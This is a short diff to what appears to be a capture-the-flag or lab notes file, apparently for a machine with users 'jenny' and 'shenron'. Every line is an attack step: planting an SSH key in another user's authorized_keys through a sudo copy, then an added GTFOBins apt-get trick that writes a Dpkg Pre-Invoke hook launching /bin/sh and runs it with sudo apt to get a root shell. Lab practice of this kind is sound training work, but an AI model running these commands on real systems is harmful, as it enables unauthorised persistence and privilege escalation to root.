@@ -1,3 +1,7 @@
 ssh-keygen
 cat home/jenny/.ssh/id_rsa.pub > tmp/authorized_keys
 sudo -u shenron /usr/bin/cp /tmp/authorized_keys /home/shenron/.ssh/
+#Used to gain root access with the apt repo. https://gtfobins.github.io/gtfobins/apt-get/
+TF=$(mktemp)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+sudo apt install -c $TF sl
